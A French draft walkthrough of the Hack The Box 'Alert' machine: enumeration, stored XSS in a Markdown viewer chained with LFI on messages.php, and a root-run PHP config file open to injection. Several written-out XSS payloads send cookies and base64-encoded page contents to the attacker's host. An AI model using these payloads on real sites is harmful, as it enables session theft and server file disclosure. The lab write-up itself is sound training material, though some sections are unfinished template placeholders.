---
# === Archetype writeups – v1 (stable) ===
# === Archetype: writeups (Page Bundle) ===
# Copié vers content/writeups/<nom_ctf>/index.md

# H1 SEO (via title, pas dans le markdown)
title: "Alert — HTB Easy Writeup & Walkthrough"
linkTitle: "Alert"
slug: "alert"
date: 2026-03-21T09:36:20+01:00
#lastmod: 2026-03-21T09:36:20+01:00
draft: true

# --- PaperMod / navigation ---
type: "writeups"
summary: "Writeup générique de machine CTF : documentation de la phase d'énumération, exploitation du foothold, escalade de privilèges et capture des flags. Sert de modèle structuré pour rédiger les solutions détaillées"
description: "Writeup HTB Easy combinant approche pédagogique et analyse technique, avec énumération claire, compréhension de la vulnérabilité et progression structurée jusqu’à l’escalade."
tags: ["Easy"]
categories: ["Mes writeups"]

# --- TOC & mise en page ---
ShowToc: true
TocOpen: true
# toc_droite: 1

# --- Cover / images (Page Bundle) ---
cover:
  image: "image.png"
  alt: "Alert"
  caption: ""
  relative: true
  hidden: false
  hiddenInList: false
  hiddenInSingle: false

# --- Paramètres CTF (placeholders à éditer après création) ---
ctf:
  platform: "Hack The Box"
  machine: "Alert"
  difficulty: "Easy | Medium | Hard"
  target_ip: "10.129.x.x"
  skills: ["Enumeration","Web","Privilege Escalation"]
  time_spent: "2h"
  # vpn_ip: "10.10.14.xx"
  # notes: "Points d'attention…"

# --- Options diverses ---
# weight: 10
# ShowBreadCrumbs: true
# ShowPostNavLinks: true

# --- SEO Reminders (à compléter après création) ---
# 1) Titre :
#    - Doit contenir : Nom Machine + HTB Easy + Writeup
# 2) Description :
#    - Résumé 130–160 caractères
#    - Style “Mix Parfait” : pédagogique + technique
#    - Exemple : "Writeup de <machine> (HTB Easy) : énumération claire, analyse de la vulnérabilité et escalade structurée."
# 3) ALT (image de couverture) :
#    - Mixer vulnérabilité + pédagogie + progression
#    - Exemple : "Machine <machine> HTB Easy vulnérable à <faille>, expliquée étape par étape jusqu'à l'escalade."
# 4) Tags :
#    - Toujours ["Easy"]
#    - Ajouter d'autres selon le thème : ["web","shellshock","heartbleed","enum"]
# 5) Structure :
#    - H1 = titre
#    - Description = meta description + preview social
#    - ALT = SEO image + accessibilité

# --- SEO CHECKLIST (à valider avant publication) ---

# [ ] 1) Titre (title + H1)
#     - Contient : Nom Machine + HTB Easy + Writeup
#     - Unique sur le site
#     - Lisible hors contexte HTB

# [ ] 2) Description (meta)
#     - 130–160 caractères
#     - Pas générique
#     - Ton pédagogique + technique
#     - Exemple :
#       "Writeup de <machine> (HTB Easy) : énumération claire,
#        compréhension de la vulnérabilité et escalade structurée."

# [ ] 3) Image de couverture
#     - Présente (ou fallback)
#     - Nom explicite
#     - Dimensions cohérentes

# [ ] 4) ALT de l’image
#     - Décrit la machine + l’approche
#     - Pédagogique (pas juste technique)
#     - Exemple :
#       "Machine <machine> HTB Easy exploitée étape par étape,
#        de l’énumération à l’escalade de privilèges."

# [ ] 5) Tags
#     - Toujours inclure la difficulté (ex: "Easy")
#     - Ajouter uniquement des tags techniques réels

# [ ] 6) Structure du contenu
#     - Un seul H1
#     - Sections claires et hiérarchisées
#     - Pas de sections SEO artificielles

---

<!-- ====================================================================
Tableau d'infos (modèle) — Remplacer les valeurs entre <...> après création.
Aucun templating Hugo dans le corps, pour éviter les erreurs d'archetype.
====================================================================
| Champ          | Valeur |
|----------------|--------|
| **Plateforme** | <Hack The Box> |
| **Machine**    | <Alert> |
| **Difficulté** | <Easy / Medium / Hard> |
| **Cible**      | <10.129.x.x> |
| **Durée**      | <2h> |
| **Compétences**| <Enumeration, Web, Privilege Escalation> |

---
-->
## Introduction

- Contexte (source, thème, objectif).
- Hypothèses initiales (services attendus, techno probable).
- Objectifs : obtenir `user.txt` puis `root.txt`.

---

## Énumération

{{< enum-intro >}}

### Scan initial

Le scan TCP complet (`scans_nmap/full_tcp_scan.txt`) permet d’identifier les ports ouverts suivants :

> Note : les IP et les timestamps peuvent varier selon les resets HTB ; l’important ici est la surface exposée.

```bash
# Nmap 7.98 scan initiated Sat Mar 21 09:53:00 2026 as: /usr/lib/nmap/nmap --privileged -Pn -p- --min-rate 5000 -T4 -oN scans_nmap/full_tcp_scan.txt alert.htb
Nmap scan report for alert.htb (10.129.231.188)
Host is up (0.015s latency).
Not shown: 65532 closed tcp ports (reset)
PORT      STATE    SERVICE
22/tcp    open     ssh
80/tcp    open     http
12227/tcp filtered unknown

# Nmap done at Sat Mar 21 09:53:07 2026 -- 1 IP address (1 host up) scanned in 6.95 seconds
```

### Scan FTP/SMB (si services détectés)

Après le scan initial, le script enchaîne automatiquement avec une phase d’énumération ciblée **FTP/SMB** si l’un des services suivants est détecté :
- **FTP** sur le port **21**
- **SMB** sur le port **139** et/ou **445**

Les résultats de cette énumération sont enregistrés dans le fichier `scans_nmap/enum_ftp_smb_scan.txt`

```bash
# mon-nmap — ENUM FTP / SMB
# Target : alert.htb
# Date   : 2026-03-21T09:53:07+01:00

Aucun service FTP (21) ni SMB (139/445) détecté.
Ports ouverts détectés : 22,80
```



### Scan agressif

Le script enchaîne ensuite automatiquement sur un scan agressif orienté vulnérabilités, ce qui te permet de repérer rapidement les services à examiner en priorité.

Voici le résultat (`scans_nmap/aggressive_vuln_scan.txt`) :

```bash
[+] Scan agressif orienté vulnérabilités (CTF-perfect LEGACY) pour alert.htb
[+] Commande utilisée :
    nmap -Pn -A -sV -p"22,80" --script="(http-vuln-* or http-shellshock or ssl-heartbleed) and not (http-vuln-cve2017-1001000 or http-sql-injection or ssl-cert or sslv2 or ssl-dh-params)" --script-timeout=30s -T4 "alert.htb"

# Nmap 7.98 scan initiated Sat Mar 21 09:53:07 2026 as: /usr/lib/nmap/nmap --privileged -Pn -A -sV -p22,80 "--script=(http-vuln-* or http-shellshock or ssl-heartbleed) and not (http-vuln-cve2017-1001000 or http-sql-injection or ssl-cert or sslv2 or ssl-dh-params)" --script-timeout=30s -T4 -oN scans_nmap/aggressive_vuln_scan_raw.txt alert.htb
Nmap scan report for alert.htb (10.129.231.188)
Host is up (0.016s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19, Linux 5.0 - 5.14
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 22/tcp)
HOP RTT      ADDRESS
1   58.01 ms 10.10.16.1
2   7.99 ms  alert.htb (10.129.231.188)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Mar 21 09:53:22 2026 -- 1 IP address (1 host up) scanned in 14.36 seconds
```



### Scan ciblé CMS

Le script exécute ensuite un scan ciblé CMS (scans_nmap/cms_vuln_scan.txt).

```bash
# Nmap 7.98 scan initiated Sat Mar 21 09:53:22 2026 as: /usr/lib/nmap/nmap --privileged -Pn -sV -p22,80 --script=http-wordpress-enum,http-wordpress-brute,http-wordpress-users,http-drupal-enum,http-drupal-enum-users,http-joomla-brute,http-generator,http-robots.txt,http-title,http-headers,http-methods,http-enum,http-devframework,http-cakephp-version,http-php-version,http-config-backup,http-backup-finder,http-sitemap-generator --script-timeout=30s -T4 -oN scans_nmap/cms_vuln_scan.txt alert.htb
Nmap scan report for alert.htb (10.129.231.188)
Host is up (0.014s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-devframework: Couldn't determine the underlying framework or CMS. Try increasing 'httpspider.maxpagecount' value to spider more pages.
| http-title: Alert - Markdown Viewer
|_Requested resource was index.php?page=alert
| http-headers: 
|   Date: Sat, 21 Mar 2026 08:53:30 GMT
|   Server: Apache/2.4.41 (Ubuntu)
|   Connection: close
|   Content-Type: text/html; charset=UTF-8
|   
|_  (Request type: HEAD)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-sitemap-generator: 
|   Directory structure:
|     /
|       Other: 1; php: 3
|     /css/
|       css: 1
|   Longest directory structure:
|     Depth: 1
|     Dir: /css/
|   Total files found (by extension):
|_    Other: 1; css: 1; php: 3
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Mar 21 09:53:37 2026 -- 1 IP address (1 host up) scanned in 14.73 seconds
```



### Scan UDP rapide

Un scan UDP rapide est également lancé afin d’identifier d’éventuels services exposés (`scans_nmap/udp_vuln_scan.txt`).

```bash
# Nmap 7.98 scan initiated Sat Mar 21 09:53:37 2026 as: /usr/lib/nmap/nmap --privileged -n -Pn -sU --top-ports 20 -T4 -oN scans_nmap/udp_vuln_scan.txt alert.htb
Nmap scan report for alert.htb (10.129.231.188)
Host is up (0.017s latency).

PORT      STATE         SERVICE
53/udp    open|filtered domain
67/udp    closed        dhcps
68/udp    open|filtered dhcpc
69/udp    closed        tftp
123/udp   closed        ntp
135/udp   closed        msrpc
137/udp   open|filtered netbios-ns
138/udp   open|filtered netbios-dgm
139/udp   closed        netbios-ssn
161/udp   closed        snmp
162/udp   open|filtered snmptrap
445/udp   closed        microsoft-ds
500/udp   closed        isakmp
514/udp   closed        syslog
520/udp   open|filtered route
631/udp   closed        ipp
1434/udp  closed        ms-sql-m
1900/udp  closed        upnp
4500/udp  open|filtered nat-t-ike
49152/udp closed        unknown

# Nmap done at Sat Mar 21 09:53:45 2026 -- 1 IP address (1 host up) scanned in 8.81 seconds
```



### Énumération des chemins web
Pour la découverte des chemins web, tu peux utiliser le script dédié {{< script "mon-recoweb" >}}

```bash
mon-recoweb alert.htb

# Résultats dans le répertoire scans_recoweb/
#  - scans_recoweb/RESULTS_SUMMARY.txt     ← vue d’ensemble des découvertes
#  - scans_recoweb/dirb.log
#  - scans_recoweb/dirb_hits.txt
#  - scans_recoweb/ffuf_dirs.txt
#  - scans_recoweb/ffuf_dirs_hits.txt
#  - scans_recoweb/ffuf_files.txt
#  - scans_recoweb/ffuf_files_hits.txt
#  - scans_recoweb/ffuf_dirs.json
#  - scans_recoweb/ffuf_files.json

```

Le fichier RESULTS_SUMMARY.txt te permet alors d’identifier rapidement les chemins réellement intéressants, sans avoir à parcourir l’ensemble des logs générés par les outils.

```bash
===== mon-recoweb — RÉSUMÉ DES RÉSULTATS =====
Commande principale : /home/kali/.local/bin/mes-scripts/mon-recoweb
Script              : mon-recoweb v2.2.1

Cible        : alert.htb
Périmètre    : /
Date début   : 2026-03-21 09:57:28

Commandes exécutées (exactes) :

[dirb — découverte initiale]
dirb http://alert.htb/ /usr/share/wordlists/dirb/common.txt -r | tee scans_recoweb/alert.htb/dirb.log

[ffuf — énumération des répertoires]
ffuf -u http://alert.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -t 30 -timeout 10 -fc 404 -of json -o scans_recoweb/alert.htb/ffuf_dirs.json 2>&1 | tee scans_recoweb/alert.htb/ffuf_dirs.log

[ffuf — énumération des fichiers]
ffuf -u http://alert.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt -t 30 -timeout 10 -fc 404 -of json -o scans_recoweb/alert.htb/ffuf_files.json 2>&1 | tee scans_recoweb/alert.htb/ffuf_files.log

Processus de génération des résultats :
- Les sorties JSON produites par ffuf constituent la source de vérité.
- Les entrées pertinentes sont extraites via jq (URL, code HTTP, taille de réponse).
- Les réponses assimilables à des soft-404 sont filtrées par comparaison des tailles et des codes HTTP.
- Les URLs finales sont reconstruites à partir du périmètre scanné (racine du site ou sous-répertoire ciblé).
- Les résultats sont normalisés sous la forme :
    http://cible/chemin (CODE:xxx|SIZE:yyy)
- Les chemins sont ensuite classés par type :
    • répertoires (/chemin/)
    • fichiers (/chemin.ext)
- Le fichier RESULTS_SUMMARY.txt est généré par agrégation finale, sans retraitement manuel,
  garantissant la reproductibilité complète du scan.

----------------------------------------------------

=== Résultat global (agrégé) ===

http://alert.htb/. (CODE:302|SIZE:660)
http://alert.htb/contact.php (CODE:200|SIZE:24)
http://alert.htb/css/
http://alert.htb/css/ (CODE:301|SIZE:304)
http://alert.htb/.htaccess.bak (CODE:403|SIZE:274)
http://alert.htb/.htaccess (CODE:403|SIZE:274)
http://alert.htb/.htc (CODE:403|SIZE:274)
http://alert.htb/.ht (CODE:403|SIZE:274)
http://alert.htb/.htgroup (CODE:403|SIZE:274)
http://alert.htb/.htm (CODE:403|SIZE:274)
http://alert.htb/.html (CODE:403|SIZE:274)
http://alert.htb/.htpasswd (CODE:403|SIZE:274)
http://alert.htb/.htpasswds (CODE:403|SIZE:274)
http://alert.htb/.htuser (CODE:403|SIZE:274)
http://alert.htb/index.php (CODE:302|SIZE:660)
http://alert.htb/messages/
http://alert.htb/messages/ (CODE:301|SIZE:309)
http://alert.htb/messages.php (CODE:200|SIZE:1)
http://alert.htb/.php (CODE:403|SIZE:274)
http://alert.htb/server-status (CODE:403|SIZE:274)
http://alert.htb/server-status/ (CODE:403|SIZE:274)
http://alert.htb/uploads/
http://alert.htb/uploads/ (CODE:301|SIZE:308)
http://alert.htb/wp-forum.phps (CODE:403|SIZE:274)

=== Détails par outil ===

[DIRB]
http://alert.htb/css/
http://alert.htb/index.php (CODE:302|SIZE:660)
http://alert.htb/messages/
http://alert.htb/server-status (CODE:403|SIZE:274)
http://alert.htb/uploads/

[FFUF — DIRECTORIES]
http://alert.htb/css/ (CODE:301|SIZE:304)
http://alert.htb/messages/ (CODE:301|SIZE:309)
http://alert.htb/server-status/ (CODE:403|SIZE:274)
http://alert.htb/uploads/ (CODE:301|SIZE:308)

[FFUF — FILES]
http://alert.htb/. (CODE:302|SIZE:660)
http://alert.htb/contact.php (CODE:200|SIZE:24)
http://alert.htb/.htaccess.bak (CODE:403|SIZE:274)
http://alert.htb/.htaccess (CODE:403|SIZE:274)
http://alert.htb/.htc (CODE:403|SIZE:274)
http://alert.htb/.ht (CODE:403|SIZE:274)
http://alert.htb/.htgroup (CODE:403|SIZE:274)
http://alert.htb/.htm (CODE:403|SIZE:274)
http://alert.htb/.html (CODE:403|SIZE:274)
http://alert.htb/.htpasswd (CODE:403|SIZE:274)
http://alert.htb/.htpasswds (CODE:403|SIZE:274)
http://alert.htb/.htuser (CODE:403|SIZE:274)
http://alert.htb/index.php (CODE:302|SIZE:660)
http://alert.htb/messages.php (CODE:200|SIZE:1)
http://alert.htb/.php (CODE:403|SIZE:274)
http://alert.htb/wp-forum.phps (CODE:403|SIZE:274)
```



### Recherche de vhosts

Enfin, tu peux tester la présence de vhosts à l’aide du script {{< script "mon-subdomains" >}}.

```bash
mon-subdomains alert.htb

# Résultats dans le répertoire scans_subdomains/
#  - scans_subdomains/scan_vhosts.txt
```

Même si aucun vhost n’est détecté, ce fichier permet de confirmer que le fuzzing n’a rien révélé d’exploitable.

```bash
=== mon-subdomains alert.htb START ===
Script       : mon-subdomains
Version      : mon-subdomains 2.0.0
Date         : 2026-03-21 09:58:24
Domaine      : alert.htb
IP           : 10.129.231.188
Mode         : large
Master       : /usr/share/wordlists/htb-dns-vh-5000.txt
Codes        : 200,301,302,401,403  (strict=1)

VHOST totaux : 1
  - statistics.alert.htb

--- Détails par port ---
Port 80 (http)
  Baseline#1: code=301 size=311 words=28 (Host=1ibj84efoa.alert.htb)
  Baseline#2: code=301 size=311 words=28 (Host=ehbl83zc3p.alert.htb)
  Baseline#3: code=301 size=311 words=28 (Host=2xr4e6jeq7.alert.htb)
  After-redirect#1: code=200 size=966 words=66
  After-redirect#2: code=200 size=966 words=66
  After-redirect#3: code=200 size=966 words=66
  VHOST (1)
    - statistics.alert.htb



=== mon-subdomains alert.htb END ===
```



## Prise pied

Lorsque tu accèdes à `http://alert.htb`, tu arrives sur la page **“Markdown Viewer”**, qui est la première page affichée par l’application.



![Interface Markdown Viewer avec upload de fichier Markdown et bouton Browse sur alert.htb](markdown-viewer.png)

Sur cette page, un menu te permet de naviguer entre plusieurs pages :
 **Markdown Viewer**, **Contact us**, **About us** et **Donate**.

La page **Markdown Viewer** attire particulièrement l’attention, car la présence d’un bouton **“Browse”** suggère un mécanisme d’upload de fichiers Markdown.

C’est cette fonctionnalité d’upload de fichiers `.md` que tu vas explorer dans la suite de l’analyse.

### Test du rendu Markdown

Pour commencer, tu peux créer un premier fichier Markdown simple afin de comprendre comment le contenu est traité par l’application.

Par exemple, crée un fichier `test.md` avec le contenu suivant :

```markdown
# Test Markdown

Ceci est un test.Ensuite :
```

Ensuite :

1. Clique sur le bouton **“Browse”**
2. Sélectionne ton fichier `test.md`
3. Clique sur **“View Markdown”** pour uploader et afficher le contenu

Le contenu est alors affiché dans l’interface.

![Affichage du fichier test.md dans Markdown Viewer après upload sur alert.htb](view-test-md.png)



> **Note :** un bouton **“Share Markdown”** est également présent sur la page et pourrait permettre de générer un lien de partage du contenu. Cette fonctionnalité sera analysée plus loin.

Ce premier test te permet de valider que :

- les fichiers `.md` sont bien acceptés
- le contenu est interprété et rendu dans le navigateur

À ce stade, tu contrôles donc directement le contenu affiché dans la page.

### Injection XSS dans le Markdown

Maintenant que tu contrôles le contenu affiché via le fichier `.md`, l’étape suivante consiste à tester si ce contenu est correctement filtré.

Pour cela, tu peux modifier ton fichier `test.md` en y ajoutant un script simple :

```markdown
# Test XSS

<script>alert(1)</script>
```

Ensuite, répète les mêmes étapes :

1. Clique sur **“Browse”**
2. Sélectionne ton fichier `test.md`
3. Clique sur **“View Markdown”**


#### Observation du comportement

Lors de l’affichage du message, une alerte JavaScript apparaît.

![Alerte JavaScript déclenchée par une faille XSS dans Markdown Viewer sur alert.htb](xss-alert.png)

Cela signifie que le code JavaScript est exécuté directement dans ton navigateur.

#### Analyse

Ce comportement indique clairement que :

- le contenu Markdown n’est **pas correctement filtré**
- les balises `<script>` sont **interprétées par le navigateur**
- il est possible d’injecter et d’exécuter du JavaScript

Tu es donc face à une **faille XSS (Cross-Site Scripting)**, une vulnérabilité qui permet d’injecter et d’exécuter du code JavaScript dans le navigateur d’un utilisateur.

Dans ce cas, il s’agit très probablement d’une **XSS stockée (Stored XSS)**, c’est-à-dire que le code malveillant est enregistré par l’application et exécuté à chaque affichage.

#### Impact

À ce stade, tu peux :

- exécuter du JavaScript dans ton propre navigateur
- modifier dynamiquement le contenu de la page
- interagir avec l’application côté client

Mais surtout, si ce contenu est consulté par un autre utilisateur, le script s’exécutera dans **son navigateur, avec ses droits**.

Si tu parviens à faire lire ce contenu par un **administrateur**, tu pourras alors exécuter du code dans **son navigateur**, comme si tu étais **administrateur de l’application**, avec les mêmes droits et possibilités.

### Test d’exfiltration via XSS

Maintenant que tu sais que tu peux exécuter du JavaScript dans ton navigateur, tu peux tester s’il est possible d’extraire des informations depuis la page.

Une première idée consiste à récupérer les cookies de session, car ils sont utilisés par l’application pour reconnaître un utilisateur déjà connecté. Les récupérer peut donc permettre d’usurper son identité.

#### Création du fichier .md pour récupérer les cookies

Pour cela, tu peux modifier ton fichier `test.md` avec le contenu suivant :

```markdown
# Alert Test

Ceci est un test Markdown.

<script>
new Image().src="http://10.10.x.x:8000/?c="+document.cookie;
</script>
```

La ligne `new Image().src="http://10.10.x.x:8000/?c="+document.cookie;` demande au navigateur de contacter ta machine Kali en utilisant l’adresse IP `10.10.x.x` de ton interface `tun0`.

Les cookies récupérés sont ceux du site que tu es en train de consulter, ici la page du **Markdown Viewer (`visualizer.php`) sur `alert.htb`**.

Pour vérifier concrètement ce comportement, tu peux lancer un serveur sur ta machine Kali afin de visualiser les requêtes envoyées par le navigateur.

#### Récupération sur la machine Kali

Pour vérifier que les cookies sont bien envoyés vers ta machine, tu peux mettre en place un listener sur Kali.

Pour cela, lance un serveur HTTP simple sur le port 8000 :

```bash
python3 -m http.server 8000
```

Ce serveur va écouter les connexions entrantes sur ton interface `tun0`.

Recharge ensuite ton fichier Markdown dans l’application.

Dans le terminal où le serveur est lancé, tu observes une requête entrante :

```bash
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.x.x - - [27/Mar/2026 10:44:40] "GET /?c= HTTP/1.1" 200 -
```

La requête est bien reçue par ton serveur, ce qui confirme que le script est exécuté et que le navigateur contacte ta machine.

On remarque également que l’adresse IP affichée (`10.10.x.x`) correspond à ta propre machine (interface `tun0`).

Cela prouve que c’est bien **ton navigateur** qui exécute le script et envoie la requête vers ton serveur.

Cependant, la valeur du paramètre `c` est vide : aucun cookie n’est envoyé dans ce cas.

Cela s’explique par le fait que tu es actuellement dans un contexte non authentifié ou sans cookie exploitable.

Le mécanisme fonctionne donc correctement, mais il faudra exécuter ce code dans un contexte plus intéressant, par exemple celui d’un administrateur, pour récupérer des informations utiles.

------

### Passage au contexte administrateur

L’application propose une fonctionnalité **“Contact us”** permettant de transmettre un lien à un administrateur.

L’objectif devient alors clair :

- créer un message contenant un payload XSS
- récupérer son lien via “Share”
- envoyer ce lien à l’administrateur

Lorsque l’admin ouvre le message, le JavaScript s’exécute **dans son navigateur**, avec ses privilèges.

------

### Exfiltration de contenu avec JavaScript

Une fois le XSS confirmé, on peut aller plus loin que de simples alertes.

L’idée est d’utiliser JavaScript pour :

1. envoyer une requête vers une ressource interne
2. récupérer son contenu
3. l’exfiltrer vers notre machine

Un premier test consiste à récupérer la page suivante :

```
http://alert.htb/messages.php
```

Payload utilisé :

```
<script>
fetch('http://alert.htb/messages.php')
  .then(r => r.text())
  .then(data => {
    new Image().src = 'http://10.10.x.x:8000/?d=' + btoa(data);
  });
</script>
```

👉 Explication :

- `fetch()` récupère le contenu de la page
- `r.text()` convertit la réponse en texte
- `btoa()` encode les données en base64
- `new Image().src` envoie les données vers notre serveur

Lorsque l’administrateur charge la page piégée, une requête est envoyée vers notre machine contenant les données récupérées.

------

### Découverte d’un point d’entrée LFI

La réponse obtenue révèle la présence de paramètres intéressants :

```
messages.php?file=...
```

Cela suggère que l’application permet de lire des fichiers côté serveur.

On teste alors une inclusion de fichier classique :

```
../../../../etc/passwd
```

Payload final :

```
<script>
fetch('http://alert.htb/messages.php?file=../../../../etc/passwd')
  .then(r => r.text())
  .then(data => {
    new Image().src = 'http://10.10.x.x:8000/?d=' + btoa(data);
  });
</script>
```

------

### Validation de la lecture de fichiers

Après envoi du lien à l’administrateur, on reçoit sur notre serveur le contenu encodé.

Une fois décodé, on obtient :

```
root:x:0:0:root:/root:/bin/bash
...
```

👉 La vulnérabilité est confirmée :

- XSS stockée → exécution côté admin
- - LFI via `messages.php`
- = **lecture arbitraire de fichiers sur le serveur**

------

### Conclusion de la prise de pied

À ce stade, on dispose :

- d’une exécution JavaScript dans le navigateur admin
- d’un accès indirect aux fichiers du serveur
- d’un canal d’exfiltration fiable

👉 Cela constitue une **prise de pied complète côté web**, permettant d’envisager la récupération de credentials ou d’autres fichiers sensibles pour aller plus loin.

---

## Escalade de privilèges

{{< escalade-intro user="albert" >}}

### Sudo -l

**Résultat**

```bash
Sorry, user albert may not run sudo on alert.
```

L’utilisateur `albert` ne peut exécuter aucune commande en tant que root via sudo.

------

### Recherche de binaires SUID

Tu poursuis l’énumération en recherchant les binaires SUID, qui permettent parfois d’exécuter des commandes avec les privilèges de leur propriétaire.

```bash
find / -perm -4000 -type f 2>/dev/null
```

**Résultat (extrait)**

```bash
/opt/google/chrome/chrome-sandbox
/usr/bin/chfn
/usr/bin/mount
/usr/bin/su
/usr/bin/newgrp
/usr/bin/sudo
/usr/bin/gpasswd
/usr/bin/fusermount
/usr/bin/passwd
/usr/bin/umount
/usr/bin/at
/usr/bin/chsh
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
```

Il s’agit uniquement de binaires système classiques, sans piste d’exploitation directe.

------

### Analyse des Linux capabilities

Tu vérifies ensuite les capabilities Linux, qui permettent à certains binaires d’effectuer des actions privilégiées sans être root.

```bash
getcap -r / 2>/dev/null
```

**Résultat**

```bash
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/ping = cap_net_raw+ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
```

Aucune capability exploitable dans ce contexte.

------

### Inspection des tâches cron

Tu vérifies ensuite les tâches planifiées :

```bash
cat /etc/crontab
```

**Résultat**

```bash
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
```

Rien d’anormal ici, uniquement des tâches système classiques.

------

### Analyse des services locaux

Tu identifies ensuite les services en écoute :

```bash
netstat -tulpn
```

**Résultat (extrait)**

```bash
tcp        0      0 127.0.0.1:8080          LISTEN
tcp        0      0 0.0.0.0:22              LISTEN
tcp6       0      0 :::80                   LISTEN
```

Un service est accessible uniquement en local sur le port `127.0.0.1:8080`, ce qui peut être intéressant mais ne constitue pas une piste immédiate.

### Choix du répertoire de travail

Tu remarques rapidement que les répertoires `/tmp` et `/dev/shm` sont régulièrement nettoyés sur cette machine.

Cela pose un problème : les fichiers que tu y déposes (scripts, outils, payloads) peuvent disparaître avant d’être exploités.

Il est donc nécessaire de trouver un répertoire :

- accessible en lecture et en écriture par l’utilisateur `albert`
- non soumis à un mécanisme de nettoyage

Tu peux identifier les répertoires accessibles avec :

```bash
find / -type d -writable 2>/dev/null
```

Parmi les résultats, le répertoire `/var/tmp` attire l’attention.

Contrairement à `/tmp` et `/dev/shm`, il n’est pas nettoyé automatiquement et permet de conserver les fichiers plus longtemps.

**Tu utilises donc `/var/tmp` comme répertoire de travail pour la suite de l’exploitation.**

### Analyse automatisée des SUID avec suid3num.py

Pour compléter la recherche manuelle des binaires SUID, tu utilises l’outil `suid3num.py`, qui permet d’identifier rapidement les binaires potentiellement exploitables et de les comparer avec les entrées connues de [GTFOBins](https://gtfobins.org/).

Tu le télécharges et l’exécutes depuis `/var/tmp` :

```bash
cd /var/tmp
wget http://10.10.x.x:8000/suid3num.py
python3 suid3num.py
```

**Résultat (extrait)**

```bash
[!] Default Binaries (Don't bother)
/opt/google/chrome/chrome-sandbox
/usr/bin/chfn
/usr/bin/mount
/usr/bin/su
/usr/bin/newgrp
/usr/bin/sudo
/usr/bin/gpasswd
/usr/bin/fusermount
/usr/bin/passwd
/usr/bin/umount
/usr/bin/at
/usr/bin/chsh
/usr/lib/eject/dmcrypt-get-device
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper

[~] Custom SUID Binaries (Interesting Stuff)
------------------------------

[#] SUID Binaries found in GTFO bins..
[!] None :(
```

Aucun binaire SUID personnalisé ni exploitable n’est identifié.

Tu confirmes ainsi que la piste des binaires SUID ne mène à rien dans ce cas précis, ce qui t’oriente vers d’autres vecteurs d’escalade de privilèges.

------

### pspy64

Tu lances également `pspy64` dans une deuxième session SSH afin d’observer en temps réel les processus exécutés sur la machine, notamment ceux lancés par root.

Tu le télécharges et l’exécutes depuis le répertoire persistant (`/var/tmp`) :

```bash
cd /var/tmp
wget http://10.10.16.93:8000/pspy64
chmod +x pspy64
./pspy64
```

Très rapidement, une activité répétée toutes les minutes attire ton attention :
```bash
CMD: UID=0 | /usr/bin/php -f /opt/website-monitor/monitor.php
```

Tu sais donc que `/opt/website-monitor/monitor.php` est lancé régulièrement avec les privilèges root.

C’est exactement le type de situation que tu recherches pour une escalade de privilèges : un script exécuté par root que tu peux modifier ou détourner.

Tu poursuis donc l’analyse en examinant le contenu de `monitor.php`.

### Analyse de `monitor.php`

Grâce à `pspy64`, tu as identifié l’exécution régulière du script suivant par root :

```
/usr/bin/php -f /opt/website-monitor/monitor.php
```

En analysant ce script, tu repères l’inclusion du fichier :

```
include('config/configuration.php');
```

Tu vérifies alors les permissions de ce fichier :

```
ls -l /opt/website-monitor/config/configuration.php
-rwxrwxr-x 1 root management ...
```

L’utilisateur `albert`, membre du groupe `management`, peut donc modifier ce fichier.

Tu affiches ensuite son contenu :

```
cat /opt/website-monitor/config/configuration.php
<?php
define('PATH', '/opt/website-monitor');
?>
```

Ce fichier est chargé automatiquement par un script exécuté en tant que root.

**Tu peux donc y injecter du code qui sera exécuté avec les privilèges root.**









### Conclusion de l’énumération manuelle

Les vérifications classiques (sudo, SUID, capabilities, cron, services) ne révèlent aucune piste exploitable directement.

En revanche, l’analyse avec `pspy64` met en évidence un point clé : l’exécution régulière de `/opt/website-monitor/monitor.php` par root.

Ce script devient le point central de l’escalade de privilèges, car il s’exécute automatiquement avec les privilèges root et utilise des fichiers accessibles par l’utilisateur `albert`.

La suite de l’exploitation consiste donc à modifier le fichier `configuration.php`, appelé par `monitor.php`, afin d’y insérer du code et obtenir un accès root.

---









## Conclusion

- Récapitulatif de la chaîne d'attaque (du scan à root).
- Vulnérabilités exploitées & combinaisons.
- Conseils de mitigation et détection.
- Points d'apprentissage personnels.

---

## Pièces jointes (optionnel)

- Scripts, one-liners, captures, notes.  
